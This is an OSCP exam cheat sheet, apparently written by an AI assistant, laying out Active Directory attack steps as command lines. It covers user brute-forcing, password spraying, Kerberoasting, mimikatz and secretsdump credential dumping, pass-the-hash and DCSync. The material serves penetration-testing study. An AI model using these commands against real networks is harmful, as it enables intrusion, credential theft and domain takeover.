# 🛡️ OSCP Active Directory Attack Cheatsheet

## 🧭 0. Initial Recon

```bash
# Full TCP scan
nmap -p- -T4 -v $IP

# Service scan
nmap -sC -sV -p <ports> $IP
```

---

# 🧱 1. Enumeration (MS01)

## 👤 User Enumeration

```bash
# Kerbrute (user discovery)
kerbrute userenum -d <domain> --dc <DC_IP> users.txt

# RID brute (SMB)
nxc smb $IP -u '' -p '' --rid-brute

# LDAP
ldapsearch -x -h $IP -s base namingcontexts
```

---

## 🔑 Valid User Identification

```bash
kerbrute bruteuser -d <domain> --dc <DC_IP> users.txt passwords.txt
```

---

## 📂 SMB Enumeration

```bash
# Null / guest
nxc smb $IP -u '' -p '' --shares
nxc smb $IP -u 'guest' -p '' --shares

# With creds
nxc smb $IP -u <user> -p <pass> --shares
```

---

## 🔐 Password Spraying

```bash
nxc smb $IP -u users.txt -p passwords.txt
nxc winrm $IP -u users.txt -p passwords.txt
nxc rdp $IP -u users.txt -p passwords.txt
nxc ssh $IP -u users.txt -p passwords.txt
```

---

## 🎫 AS-REP Roasting

```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat

john --wordlist=/usr/share/wordlists/rockyou.txt hash.asreproast
```

---

## 🎟️ Kerberoasting

```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request

john --wordlist=/usr/share/wordlists/rockyou.txt hash.kerberoast
```

---

## 🧠 BloodHound Collection

```bash
nxc ldap <ip> -u <user> -p <pass> --bloodhound --collection All --dns-server <DC_IP>
```

Look for:

- `GenericAll`
    
- `GenericWrite`
    
- `WriteDACL`
    
- `ForceChangePassword`
    
- High-value groups (Domain Admins, Backup Operators)
    

---

## 🔍 PowerView (Windows)

```powershell
# Windows tool
Import-Module PowerView.ps1

Get-Domain
Get-DomainUser
Get-DomainGroup
Find-LocalAdminAccess
Find-InterestingDomainAcl
```

---

## 💥 Credential Dumping (Post-Admin)

```bash
# Kali
impacket-secretsdump <domain>/<user>@<IP>

# Windows (Mimikatz)
mimikatz
sekurlsa::logonpasswords
```

---

# 🔓 2. Local Privilege Escalation (MS01)

## 🔍 Enumeration

```powershell
whoami /all

# Windows tools
WinPEAS.exe
PrivEscCheck.exe
```

---

## 🔑 Credential Harvesting

Check:

- Browser creds
    
- Config files
    
- RDP saved creds
    
- Scheduled tasks
    
- Scripts with plaintext passwords
    

---

## 🧬 Token Impersonation

Look for:

```text
SeImpersonatePrivilege
SeBackupPrivilege
SeRestorePrivilege
SeManageVolumePrivilege
```

---

## ⚙️ Common PrivEsc Vectors

- Unquoted service paths
    
- Writable service binaries
    
- DLL hijacking
    
- Scheduled tasks
    
- Writable `Program Files`
    
- Startup folder
    

---

# 🔁 3. Lateral Movement (MS02)

## 🚪 Access Methods

```bash
# WinRM
evil-winrm -i $IP -u <user> -p <pass>
evil-winrm -i $IP -u <user> -H <hash>

# RDP
xfreerdp3 /v:$IP /u:<user> /p:<pass> /cert:ignore

# SMB / PsExec
nxc smb $IP -u <user> -p <pass> -x "whoami"
```

---

## 🔁 Pass Attacks

```bash
# Pass-the-Hash
evil-winrm -i $IP -u <user> -H <NTLM_HASH>

# Overpass-the-Hash (Kali - Impacket)
impacket-psexec -hashes <LM:NT> <user>@$IP

# Pass-the-Ticket (Windows - Mimikatz)
kerberos::ptt ticket.kirbi
```

---

## 🧾 LDAP Attacks

```bash
nxc ldap $IP -u <user> -p <pass> --asreproast output.txt
nxc ldap $IP -u <user> -p <pass> --kerberoasting output.txt
```

---

## 🧠 ACL Abuse

- `GenericAll` → Reset password
    
- `GenericWrite` → Modify attributes
    
- `WriteDACL` → Grant DCSync
    

---

## 🗄️ MSSQL Abuse

```bash
# If access obtained
xp_cmdshell
```

Look for:

- `SeImpersonatePrivilege`
    

---

# 👑 4. Domain Controller Compromise (DC01)

## 💥 DCSync Attack

```bash
# Windows (Mimikatz)
lsadump::dcsync /domain:<domain> /user:<user>
```

---

## 🪙 Golden / Silver Tickets (Windows)

```text
Mimikatz:
kerberos::golden
kerberos::silver
```

---

## 🔐 Dumping Credentials

```bash
# Kali
impacket-secretsdump <domain>/<user>@<DC_IP>
```

---

## 📁 GPP / cPassword

Search:

```bash
# Kali
smbclient //DC_IP/SYSVOL
```

Look for:

- `Groups.xml`
    
- `ScheduledTasks.xml`
    
- `Services.xml`
    

---

## 🧬 Other Attacks (If Applicable)

- ADCS abuse
    
- Unconstrained delegation
    
- Constrained delegation
    
- RBCD
    
- gMSA abuse
    

---

# 🔄 5. Post-Exploitation Workflow

## 🔍 Credential Dumping

```bash
# Windows
mimikatz "privilege::debug" "sekurlsa::logonpasswords"

# Kali
secretsdump.py <domain>/<user>@<IP>
```

---

## 🔎 Credential Hunting

```bash
# Windows
lazagne.exe all
```

---

## 🔗 Pivoting

```bash
# Ligolo (Kali)
# Setup agent + proxy
```

---

## 🔁 Reuse Credentials Everywhere

```bash
nxc smb/winrm/rdp/mssql $IP -u <user> -p <pass>
```

---

# ⚡ Quick Checklist (Exam Mindset)

## 🧠 Enumeration First

-  SMB shares (null + auth)
    
-  Users (RID brute / kerbrute)
    
-  AS-REP / Kerberoast
    
-  BloodHound
    

## 🔓 PrivEsc

-  WinPEAS / PrivEscCheck
    
-  Token privileges
    
-  Services / tasks / files
    

## 🔁 Lateral Movement

-  Reuse creds everywhere
    
-  Pass-the-hash / ticket
    
-  Check ACL abuse
    

## 👑 Domain Domination

-  DCSync
    
-  Dump NTDS
    
-  GPP passwords
    

---

If you want, I can turn this into:

- a **1-page ultra-condensed exam sheet**, or
    
- a **step-by-step attack flow (decision tree style)** which is super useful during OSCP.